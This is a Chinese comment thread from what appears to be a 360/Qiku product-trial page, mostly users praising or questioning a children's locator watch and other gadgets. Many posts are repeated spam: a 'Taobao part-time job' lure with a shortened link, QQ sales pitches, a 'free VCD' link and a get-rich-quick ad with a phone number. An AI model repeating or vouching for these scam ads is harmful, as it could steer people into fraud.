因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
很实用的宝贝。
好东西有点贵
哇！   超级好啊！！！笑
好贵，买不起  
有对话功能吗？比如遇危险时，或者可以有报警功能110之类的
超级不错哦！！！
真的可以控制吗？？？
第一次见这种手表很新奇关心孩子的都会买
好用吗？有人用过吗？好用也想买一个啊
最好加入烘干设计
好想要哦！有地方买吗？能抽到么？
如果可以抢到，价钱合适的话，一定买
设计成装鉓贴片比较好，不易被发现
360真是我们所有用户的福音，为我们解决了太多的东西，真心的谢谢你们！
不错，以后可以给老人买个
我要试用啊
希望能申请到吧
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
这手表感觉不错，哪有卖？ 
这对手机要求高哇
深受其害，不过科技真的这么发达了啊？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
期待，希望能选上！！支持360！
建议，加一个报警功能，如果孩子路线有什么异常也可以及时报警，还有需要网络的支持吗，如果是这样那么2g网络会不会有点影响吗，毕竟看地图2g网速慢，建立也搞一个电脑监视客户端和监视视频，在工作的时候或者在家的时候暂时没空去接孩子，也可以通过电脑来看孩子现在在干嘛！希望360把这类的产品越做越好，也希望我的申请能够通过，不用让父母担心害怕
支持奇酷！！ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
好好哦，支持一下！!!!
 超想要，我就喜欢这种又酷又有科技范的产品。
科技越来越大的进步，我们越来越幸福了，呵呵！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
期待上市。不过希望不是很贵
意念控制器，这个开发好。多用途啊，以后意念游戏的开发。鼠标的替代品。。哈哈 
智慧价值可信，市场价不行。卖得了不用。用者卖不了
说多无用，反正我信赖360的产品
我觉得这个不错
这手表不错，真心希望得到给我家女儿。 
我也喜欢，但是太贵！
儿子总是乱跑，不安生，要是能申请到这款360儿童卫士，那可算是帮我解决个大忙，真希望能得到使用的资格，我会好好的写试用报告的~
支持奇酷！希望能的到这次机会！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
看起来很不错啊，妹纸我就不喜欢喝水，有了这样一个水杯，很好呐，但是认为外形不太美观
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
很好的东东...............支持
什么时候出~
好东东 支持
防止左思右想？防止注意了不集中？锻炼注意力？
实用，超赞
试用要钱吗？几天可以送到？ 
我想要。不知道怎么搞
已经提交 为什么还显示要评论
感觉有点测谎仪( ⊙ o ⊙ )啊！ A:我一定可以完成这个任务。 B：你现在的状态能行吗？ A：相信我，不会让你失望的。 B：来，给你测一下……
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
好用，超赞
不错不错啊
太贵了太贵了，不值当
可怜的孩子们= =
防水不？进水就没用了那也不实用
哪里有卖的？
有人买吗？
哦！那质量？
支持奇酷！希望能的到这次机会！
好像不错！！
支持奇酷！希望能的到这次机会！ 
偶然看见这个网页，知道奇酷这个品牌，之前也想为什么没有这么一个产品，现在发现有了，真的想得到这个机会给我家宝宝使用，谢谢，这个产品对防止小孩走丢是很有帮助的。
试用了才能知道好不好
不错不错！！！一举两得！！！太帅了！什么时候可以有实物！不过这个要放在那儿？卫生间吗？不然水怎么进出！！！怎样清洁机器？你怎么知道衣服洗得干净不干净！有显示吗！？
对孩子来说就是一个长得好看的铁链子
我想试用！很迫切需要！谢谢！
这个东西不错，可以很好的锻炼人的注意力和集中力。
8900人民币  呵呵
什么时候发行啊  
希望能为孩子争取到一个。
帮我留一块啊 
每天都可以往里面加剩饭，还是加一次不管多少就不能再加了，不然每次打开多臭呀！我自己做一次密封好还要一个月左右才可以用呢！这么贵的东西！！实用性好像不高呀！！！家里的几盆花自己也用同样的东西（剩果皮、蔬菜、咖啡渣）做过了。买一个密封性好的玻璃容器就搞定了！
2000元以内还可以接受！
不错，如果 试用效果 好 一会帮忙再买几个 
方便  3什么时候出？ 
需要付费吗
希望吧，得到这个试用品、
需付多少钱
很期待很想试用
赞同，外满空气好家家都好
希望能给我这个试用品，我永远支持奇酷!
人类的福音呐如果便宜一点 
幸运降临可否？ 
一点都不切实际，谁会在大夏天的带着这个玩意儿，难道是说只有冬天才用手机夏天不能用。还是说它是南极***？太多不可行的因素了，被抢劫（剁手）电池使用过度（爆炸）……还有一个最可能发生的事就是：一只手长时间戴手套，在他的脱下手套的时候，两只手还是一个颜色吗？大小还一样吗？
 因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
很不错的创意啊。
永远支持奇酷，希望幸运降临哦，奇酷小编
支持奇酷！希望能得到这次机会！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
高富帅专用吗？
给孩子？？那就等于把孩子毁了！就像之前苹果的手机、平板电脑刚出来的时候，有多少孩子会在这些电子产品手里，视力下降、脊柱侧弯、小小年纪有颈椎病！一旦有了这些毛病在想治疗就不是那么简单了！现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间，多出去跑跑活动活动！而不是坐在这个只有华丽外表的‘隔离室’里。隔离了亲情，友情，失去沟通能力！！！！！这个只适合电子游戏城！不适合家里！
帮我留一块啊  
我觉得有几点需要关注的：1、电瓶本身的科技含量有多高直接决定了这辆车的市场售价。2、刹车系统：看最后一张图，任然使用的是现行市场上较为多见的摩擦式刹车，没有任何科技含量可言。3、造型：所有人消费者第一眼看上去就有购买和继续关注的冲动，在这里车上我没找到，抱歉。4、理念：和市场上大多数可以脚踏和电动相结合的东东实在算不上什么高科技哈，真心的希望你们能重新定位。
支持奇酷！希望能得到这次机会！！！ 
这个东西应该伪装成一款很普通的手表
不管能否得到这次试用机会我都永远支持奇酷! 期待
很棒，我喜欢画画，这回可以画立体了的，可能会画不好的吧~
这是个问题，一定要有解决的方法才行。
支持奇酷！希望能得到这次机会！！！ 求求小编给我这次机会 
支持奇酷！希望可以得到这个机会，我会介绍更多小朋友哦！
可否说这是大人们的福音，希望能得到一个，谢谢
喜欢音乐，用这个播放器的音质应该会提高吧，外形也很酷~给你点三十二个赞
很不错，可以快速充电，平时着急用手机，也不会等太久了
这个电子产品给我爸爸用非常合身！
支持奇酷！希望能得到这次机会！！！ 求求小编给我这次机会  
为什么闪拍是黑色的。
看不懂……但是奇酷的东西应该都不错的吧
不会骑啊~
自从当妈后情感越发丰沛，不自觉的总是为孩子提着一颗心、担着一丝牵挂，相信设计出这款产品的人员一定也有颗爱孩子的心。
妈妈再也不用担心我懒床了！
期待中。。。。。。ALYT 智能家居无线管理器进入每个家庭。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
同意，非常同意
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
应该是免费的吧？ 
看着不错的一款产品，希望我幼儿园的小朋友都得到，谢谢
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
是的，采用卫星定位，时时关注小孩的近况，  您好，我是做这个东西，有需要可以联系我QQ：330128578
价格很便宜的，  是的，采用卫星定位，时时关注小孩的近况，  您好，我是做这个东西，有需要可以联系我QQ：330128578
它是根据手机卡来收取流量费的，5块钱包月流量的，  是的，采用卫星定位，时时关注小孩的近况，  我是做这个东西，如有需要可以联系我QQ：330128578
根据手机的地图来时刻关注孩子的近况的，我是做这个东西，如有需要可以联系我QQ：330128578
质量肯定很好的啊 ，我是做这个东西，如有需要可以联系我QQ：330128578
这次的设计比上次好看多了，就算申请不到也希望尽快推出，让有需要的家长可以购买到
我是做这个东西，如有需要可以联系我QQ：330128578
我是做这个东西，如有需要可以联系我QQ：330128578
增加遇水功能，在孩子手表不正常进水的时候给家长打电话
我是做这个东西，如有需要可以联系我QQ：330128578
我是做这个东西，如有需要可以联系我QQ：330128578
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
可以设置三个监听功能的，还有一个SOS紧急呼叫功能，非常方便实用，我是做这个东西，如有需要可以联系我QQ：330128578
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我是做这个东西，如有需要可以联系我QQ：330128578
我是做这个东西，如有需要可以联系我QQ：330128578
不错  希望小朋友能得到
我是做这个东西，如有需要可以联系我QQ：330128578
以前有过这种设计理念的车子，不过好像销售的不咋样再后来就没听说过。整个电动车的设计理念很好，也特别环保，只是价格有点偏高，如果3000元以内我还是可以接受的。
我是做这个东西，如有需要可以联系我QQ：330128578
我是做这个东西，如有需要可以联系我QQ：330128578
自行车对吧，我记得有一种东西叫做能量对吧，学过物理的都知道，可以将机械动能转化为电能，我曾经在科技馆里看过这个设备，不大，如果能与这俩自行加驱动的车相结合应该会更加环保，既能锻炼身体，又能省电环保，期待哟
很希望能直接生成WORD文档。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
要是能用它给另一个佩戴者打电话，发短信就更完美了
很需要这个，我上班时中午回不了家，我的孩子的安全我就放心了。
要这个手表  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
喜欢！喜欢！
Legion Meter 充电效率加倍小配件        RMB598 
360太天真了，这样树大招风的手表。呵呵，不知道幼儿园小朋友都很喜欢抢东西吗，看见新奇的就抢过来然后说是自己的。 解决方法，内置密码，输入密码手表才能解开。如果忘记密码，那就找客服吧。 
www.momoxue.com 免费提供江苏专转本资料，2015江苏专转本
况且戴手表的人都有一个习惯吧- -。如果太热了就会拿下来，然后手表丢了
很适合每天坐车去幼儿园的孩子，车里总会有一些机器的味道，空气也不是很好，有了它，孩子会很喜欢
顶起，科幻片中的宝贝成为现实了
这个产品真的很贴心，希望先试用，让我的宝贝女儿能够及时试用上。
我傔职每天可3个小时以上，电话13603114211，李
喜欢啊 想要啊
运气棒棒！
这是什么吗？！炒鸡厉害！
希望我儿子能用上，这个东西看样子很实用
很好的产品，我需要
还有三天。。。。
呵呵，玩游戏不怕了，妈妈再也不用担心我玩游戏被虐了，哈哈，这个产品证明了，我们人类科技的进步呀 !
等待结果中。。。
真想能给我的女儿申请一个试试，能知道孩子在幼儿园和学校做什么，定位孩子走开的地方和行走路线。
我可以自己去找同学玩了 
赞！！写的不错哈 
梦想成真！
今天我钥匙丢了，车，房钥匙都在一起，一天都在找两·三百万的财产，没想到在我的包里的一空格里。~点个赞，一定要买，可范围太小了。    
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
送我一辆！
太帅了 什么时间出来啊 想买
什么时间开卖啊
我就喜欢有创意的东西
支持奇酷  推出的产品挺实用 做实事
我真希望有一个，我和我儿子天天盼着……
看到这种功能的产品，心中已经迫不及待的想用了，希望能被选中......。
希望能用上，因为真的太远了 
赞 赞  赞  急需一个
垃圾东西！貌似很落后的创新了！
宝宝4岁了，正是可爱、调皮又好动的年龄，因为工作的关系，我们只好把他和爷爷奶奶留在老家，每次爷爷奶奶带他出去玩，都让人提心吊胆，两位老人累的上气不接下气，还是无法追上宝宝的步伐，有时候真想把用绳子他拴在身边。终于在今天，盼来了360研发出的儿童卫士，希望能得到试用的机会，从而让我的家人放心，也让天下的爷爷奶奶放心、爸爸妈妈放心
现在申请的人已经有着九万多了人次了，话说，才一百个免费试用的名额啊？这可真的万里挑一啊。
希望能申请到。给孩子用，给弟弟妹妹的孩子用都可以
九万多人了，希望有个好运气，送给宝贝女儿。
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
绝对超实用的产品
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
是不是免费
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
帅气，我喜欢。
孩子每天自己上下学，如果有了它，家长就无忧了，期待快上市。
..好多人申请哦；看来大家都对这个东西感兴趣；我觉得不光是小孩子用；家里的老人年龄大的有的糊涂的经常出去找不到家的；也可以用这个；
同感........
我和孩子都非常喜欢！希望我能申请成功~！
孩子上一年级了，中午没空接他，送去午托班了，所以这段时间特别担心他的安全，希望能成功申请这个产品。
平常心，期待中~~~~~~
支持，希望我能申请成功
希望我可以成功申请到，这样，也算是替我解决了她的五岁生日礼物。真心祝福我能送给她一个称心如意的礼物！
我家小孩学校没有安装监控，希望能申请一个用，给小孩看了超喜欢，也非常支持你们的产品，就算申请不成功，希望价格定位还可以接受，希望我能申请成功~！谢谢！
好酷哦！真的好想要一台！！！
运气啊        。。。。。。
超赞的！！！
运气啊 。。。。。
好喜欢哦，好想买一个。
加上随身wifi的功能就更好了
一次性，有点不实用诶，有点小小的失望。
好赞呐，外形还OK，真希望能拥有一个
( ⊙o⊙ )哇！这正是我所需要的闹钟啊！！！
这宝贝太好了，每个功能都很贴心，360太周到了。棒棒真棒。早就想要一款这小斯了
有了这个，爸爸就不用担心车子找不到位子放了，赞一个。
还好，不错哦！
这真是一个家庭的好帮手啊！
哇塞，好酷哦！我喜欢。
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
希望能申请一个用，给小孩看了超喜欢，也非常支持你们的产品，就算申请不成功，希望价格定位还可以接受，希望我能申请成功~！谢谢！  
看起来好棒啊，希望能早日见到上市，一定会大卖的！
很好很强大
好酷，好想拥有一个，可我还是个学生，木有钱啊
哇塞，我喜欢
我要买！锁！有自行车
可以提醒人喝水的水杯，点32个赞！
好棒诶！有点动心了
希望能申请一个用，给小孩看了超喜欢，也非常支持你们的产品，就算申请不成功，希望价格定位还可以接受，希望我能申请成功~！谢谢！  
酷啊，赞一个
能得到好，得不到不悔。支持360.
我想给我弟来一个！可以吗！！！
很实用，就是有点太贵了
很好很强大，可以有
真的很不错，很方便，家务都可以用意念了，哈哈。
太棒了，可以提醒老公多喝水，很温馨的设计。
好喜欢啊，稀饭稀饭
一定要给我啊，我爱奇酷，如果给我试用我就会无限爱奇酷，奇酷，我相信你，期待你
如果是孩子不小心走失带上这款腕表还是很有帮助，但是坏人会丢掉孩子手上的这个腕表迅速带走，那时的结果是一样的。如果有哪位高人或是公司能研发一种可植入芯片或是类似虹膜·指纹这样的东西，植入或是扫描进孩子的身体不影响健康的某一部分，在孩子出生后身体状况允许的情况进行植入或扫描类似身份证，平时不启用孩子出了问题在家人通过一系列的手续后可以定位查询到孩子的踪迹我想这样的东西花多少钱家长都会买账的！
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360
支持360！
第一次知道有这么个试用申请，这个宝贝正适合我家孩子使用，希望能申请到！！
原本想着给宝贝采一款呢，无意中看到有免费申请的！！希望可以申请到。。。期待啊！！！
这个，是能反复申请机会更多，还是只能申请一次啊。
超想拥有一个，看点儿出来吧。赞，赞，赞。。
啥时候开放啊！！！
想送给女儿...
专为孩子设计的手表 值得拥有
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
希望我能收到，感觉很实用，买一个也无妨
不知道电池能用多久，希望不要是鸡肋！用不了几分钟！建议能关掉一些没用的内部程序！增强电池的能力，我想至少要能用2天才好啊。期待能中签！！！
我该怎样申请？
我现在申请到了吗？很期待！这样我上班时就不用担心儿子放学走路有没有安全了。
设计不错，如果能够再把动能转换成电能就更理想了，价格太高了，中国的穷人还是很多的。
如果能有一个试试，我想以后有机会可以好好推广
如果能送我一个，我将影响我身边的27位朋友的。 大大的影响力……
期待啊，奇酷真是太好了，搞这么有意义的活动，而且这个东西真的很实用，期待中
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
如果有一台，就好了。
奇酷真是太好了，搞这么有意义的活动，而且这个东西真的很实用
上海忠实的360用户，希望+祈祷能收到，大人们最看好的是宝宝的安全。
x希望快快上市，强烈支持奇酷，支持奇虎360！！！
改变空气质量，从T3开始！
我这边的空气质量挺差的，诚心希望T3帮我改变下环境！
为了我的宝贝，希望能选到
10W整啊。申请人数。加油。
感觉使用会不方便
这么好的东西，真的希望早点拥有！
有没有试用的，提前预约先
其实我是为83岁的老人申请，做了一辈子的老师到了老年记忆力衰退，为了防止老人走失，希望能帮老人得到
很好很强大
很好很强大
2600大洋。。。汗~
只能玩玩游戏，无法实现在现实生活中 ，。万一有人打搅和骚扰，分神的话 ，麻烦就大咯
我也喜欢这个，希望价格不是很高 
一切为了孩子，支持360！！！
希望能申请成功,很需要
听起来有点科幻。如果说的像真的一样，我也想要一个。
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
8900跟你家爸爸妈妈踩去吧。。。2 就一呵呵
谢谢支持 ：）
我建议不要只局限在儿童身上，现在中国患有老年痴呆症的老人那么多，真的推广起来，他们也会称为受益者
啥时候能上市啊
希望能申请成功，为了我那有点自闭不爱说话的孩子~~~~~~
支持360！做生态才能引领！领先！希望能申请成功感受新产品！送上详细测试报告和使用后的建议。
希望价格不会太贵，毕竟这个是防盗、防丢失、定位、的小饰品，喜欢的人很多和有创意希望会有更多的产品出来分享，加油！！！
价钱不是问题，只要为了孩子，希望申请成功
什么时候有试用啊，我正需要这么一个全面监测锻炼身体时用的这么个仪器。提前预约申请试用。
点击这里http://url.cn/QkPQtC 100%不需支付任何费用索取到乐智小天地VCD套餐
复制点击这里 http://url.cn/QkPQtC 100%不需支付任何费用索取到 儿童益智  小天地VCD套餐
复制点击这里 http://url.cn/QkPQtC 100%不需支付任何费用索取到 儿童益智  小天地VCD套餐
希望可以申请一个
点击这里http://url.cn/QkPQtC 100%不需支付任何费用索取到乐智小天地VCD套餐
不能错过的参与！
这么好的东东,希望可以试用推广,谢谢!
我跟儿子同学的妈妈们一直在寻找合适的定位追踪器,希望可以争取到使用名额,谢谢!
360你要不要这么吊？
你特么不把售价弄在 149 英镑？
这款360会火的！太实用了！
1000元创业、1年成富翁 10年打工终成空，1年创业成富翁。正在职场拼博的朋友，早8晚5的朋友，想改变命运的朋友，来吧！这是一个新兴的行业，一项国家支持的项目，也是未来发展的趋势，巨大的发展空间，人人都用的产品。 能看到此广告的朋友，祝您好运，改变命运的时刻到来了。机不可失，失不再来！把握住机会才不会后悔！！！ 当今1000元能干什么？ 详情请拨打招财热线：131-6685-9678 
